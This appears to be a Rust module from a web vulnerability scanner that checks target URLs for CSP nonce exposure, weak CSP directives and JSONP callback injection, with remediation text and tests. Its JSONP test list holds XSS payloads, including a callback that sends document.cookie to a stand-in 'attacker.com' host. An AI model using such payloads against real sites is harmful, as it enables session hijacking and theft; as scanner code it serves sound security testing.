//! CSP Nonce Leakage and JSONP Callback Manipulation Detection Module
//! 
//! Detects CSP Nonce Leakage and JSONP Callback Manipulation vulnerabilities.
//! Maintains 2GB RAM ceiling via bounded payload buffers.

use crate::findings::xss_evidence::XssEvidence;
use crate::learning::xss_cache::XssCache;
use crate::http::client::HttpClient;
use std::time::Duration;

/// Common JSONP callback parameter names
const JSONP_CALLBACK_PARAMS: &[&str] = &[
    "callback",
    "cb",
    "jsonp",
    "jsonpcallback",
    "jsonp_callback",
    "func",
    "function",
];

/// CSP Nonce/JSONP detector
pub struct CspJsonpDetector {
    http_client: HttpClient,
    cache: XssCache,
    god_mode: bool,
    timeout: Duration,
}

impl CspJsonpDetector {
    /// Create a new CSP/JSONP detector
    pub fn new(http_client: HttpClient, god_mode: bool) -> Self {
        Self {
            http_client,
            cache: XssCache::new(),
            god_mode,
            timeout: Duration::from_secs(5),
        }
    }

    /// Detect CSP nonce leakage on target URL
    pub async fn detect_csp_nonce_leakage(&self, target_url: &str) -> Vec<XssEvidence> {
        let mut evidences = Vec::new();
        
        if let Ok(response) = self.http_client.get_with_timeout(target_url, self.timeout).await {
            // Check for CSP header
            if let Some(csp) = response.headers.get("Content-Security-Policy") {
                // Check for nonce usage
                if csp.contains("nonce-") {
                    // Extract nonce values from the page
                    let nonces = self.extract_nonces(&response.body);
                    
                    if !nonces.is_empty() {
                        // Nonces found in HTML - potential leakage
                        let evidence = XssEvidence {
                            vulnerability_type: "CSP Nonce Leakage".to_string(),
                            location: target_url.to_string(),
                            payload: format!("Found {} exposed nonce(s)", nonces.len()),
                            context: crate::checks::xss::context::XssContext::Html,
                            stack_trace: None,
                            callback_triggered: false,
                            remediation: self.generate_csp_remediation(),
                            severity: crate::findings::Severity::Medium,
                        };
                        evidences.push(evidence);
                        
                        self.cache.record_bypass(target_url.to_string(), "csp_nonce_leak".to_string());
                    }
                }
                
                // Check for unsafe-inline with nonce (misconfiguration)
                if csp.contains("'unsafe-inline'") && csp.contains("nonce-") {
                    let evidence = XssEvidence {
                        vulnerability_type: "CSP Misconfiguration".to_string(),
                        location: target_url.to_string(),
                        payload: "unsafe-inline used alongside nonce (redundant)".to_string(),
                        context: crate::checks::xss::context::XssContext::Html,
                        stack_trace: None,
                        callback_triggered: false,
                        remediation: self.generate_csp_remediation(),
                        severity: crate::findings::Severity::Low,
                    };
                    evidences.push(evidence);
                    
                    self.cache.record_bypass(target_url.to_string(), "csp_misconfig".to_string());
                }
                
                // Check for weak CSP directives
                if self.is_weak_csp(csp) {
                    let evidence = XssEvidence {
                        vulnerability_type: "Weak CSP".to_string(),
                        location: target_url.to_string(),
                        payload: "Overly permissive CSP detected".to_string(),
                        context: crate::checks::xss::context::XssContext::Html,
                        stack_trace: None,
                        callback_triggered: false,
                        remediation: self.generate_csp_remediation(),
                        severity: crate::findings::Severity::Medium,
                    };
                    evidences.push(evidence);
                    
                    self.cache.record_bypass(target_url.to_string(), "weak_csp".to_string());
                }
            }
        }
        
        evidences
    }

    /// Detect JSONP callback manipulation vulnerabilities
    pub async fn detect_jsonp_manipulation(&self, target_url: &str) -> Vec<XssEvidence> {
        let mut evidences = Vec::new();
        
        for callback_param in JSONP_CALLBACK_PARAMS {
            // Test with potentially dangerous callback values
            let test_callbacks = vec![
                "alert(1)",
                "document.location='https://attacker.com/?c='+document.cookie",
                "<img src=x onerror=alert(1)>",
            ];
            
            for test_cb in test_callbacks {
                let test_url = format!("{}?{}={}", target_url, callback_param, test_cb);
                
                if let Ok(response) = self.http_client.get_with_timeout(&test_url, self.timeout).await {
                    // Check if the callback is reflected without proper sanitization
                    if response.body.contains(test_cb) {
                        // Check if it's executed as JavaScript (not escaped)
                        if self.is_executable_context(&response.body, test_cb) {
                            let evidence = XssEvidence {
                                vulnerability_type: "JSONP Callback Manipulation".to_string(),
                                location: format!("{} ({})", target_url, callback_param),
                                payload: format!("Callback: {}", test_cb),
                                context: crate::checks::xss::context::XssContext::JavaScript,
                                stack_trace: None,
                                callback_triggered: false,
                                remediation: self.generate_jsonp_remediation(),
                                severity: crate::findings::Severity::High,
                            };
                            evidences.push(evidence);
                            
                            self.cache.record_bypass(
                                format!("{}_{}", target_url, callback_param),
                                "jsonp_manipulation".to_string(),
                            );
                            break; // Found vulnerability for this param, move to next
                        }
                    }
                }
            }
        }
        
        evidences
    }

    /// Extract nonces from HTML content
    fn extract_nonces(&self, html_content: &str) -> Vec<String> {
        let mut nonces = Vec::new();
        
        // Look for nonce attributes
        let mut pos = 0;
        while let Some(start) = html_content[pos..].find("nonce=\"") {
            let abs_start = pos + start + 7; // length of 'nonce="'
            if let Some(end) = html_content[abs_start..].find('"') {
                let nonce = html_content[abs_start..abs_start + end].to_string();
                if !nonce.is_empty() && !nonces.contains(&nonce) {
                    nonces.push(nonce);
                }
                pos = abs_start + end + 1;
            } else {
                break;
            }
        }
        
        nonces
    }

    /// Check if CSP is weak/permissive
    fn is_weak_csp(&self, csp: &str) -> bool {
        let weak_patterns = [
            "script-src *",
            "script-src https:",
            "script-src 'unsafe-inline' *",
            "default-src *",
            "default-src 'unsafe-inline'",
            "style-src *",
            "style-src 'unsafe-inline' *",
        ];
        
        weak_patterns.iter().any(|pattern| csp.contains(pattern))
    }

    /// Check if callback is in executable context
    fn is_executable_context(&self, body: &str, callback: &str) -> bool {
        // Check if callback appears in a JavaScript context
        if let Some(pos) = body.find(callback) {
            let before = if pos > 20 { &body[pos - 20..pos] } else { &body[..pos] };
            
            // Not executable if properly escaped or in comment
            if before.ends_with("// ") || before.ends_with("/* ") {
                return false;
            }
            
            // Executable if looks like function call
            let after = if pos + callback.len() + 1 < body.len() {
                &body[pos + callback.len()..pos + callback.len() + 1]
            } else {
                ""
            };
            
            return after == "(" || after == "";
        }
        
        false
    }

    /// Generate CSP remediation guidance
    fn generate_csp_remediation(&self) -> String {
        "Use strict Content Security Policy with specific domain allowlists. \
         Never expose nonce values in client-side code or logs. Rotate nonces \
         per request. Avoid 'unsafe-inline', 'unsafe-eval', and wildcard (*) \
         sources. Use 'strict-dynamic' for modern browsers. Implement CSP \
         reporting to monitor violations."
            .to_string()
    }

    /// Generate JSONP remediation guidance
    fn generate_jsonp_remediation(&self) -> String {
        "Validate JSONP callback parameter against a strict allowlist of \
         alphanumeric characters only (a-z, A-Z, 0-9, underscore). Reject \
         callbacks containing special characters, parentheses, or angle \
         brackets. Consider migrating to CORS-based APIs instead of JSONP. \
         Set Content-Type: application/javascript with appropriate CSP."
            .to_string()
    }

    /// Enable god-mode for intrusive validation
    pub fn enable_god_mode(&mut self) {
        self.god_mode = true;
        self.timeout = Duration::from_secs(10);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_csp_jsonp_detector_creation() {
        let client = HttpClient::mock();
        let detector = CspJsonpDetector::new(client, false);
        assert!(!detector.god_mode);
    }

    #[test]
    fn test_jsonp_params_defined() {
        assert!(JSONP_CALLBACK_PARAMS.contains(&"callback"));
        assert!(JSONP_CALLBACK_PARAMS.contains(&"jsonp"));
    }

    #[test]
    fn test_nonce_extraction() {
        let detector = CspJsonpDetector::new(HttpClient::mock(), false);
        
        let html = r#"<script nonce="abc123">alert(1)</script><script nonce="xyz789">alert(2)</script>"#;
        let nonces = detector.extract_nonces(html);
        
        assert_eq!(nonces.len(), 2);
        assert!(nonces.contains(&"abc123".to_string()));
        assert!(nonces.contains(&"xyz789".to_string()));
    }

    #[test]
    fn test_weak_csp_detection() {
        let detector = CspJsonpDetector::new(HttpClient::mock(), false);
        
        let weak_csp = "default-src *; script-src 'self'";
        assert!(detector.is_weak_csp(weak_csp));
        
        let strong_csp = "default-src 'self'; script-src 'nonce-abc123'";
        assert!(!detector.is_weak_csp(strong_csp));
    }
}
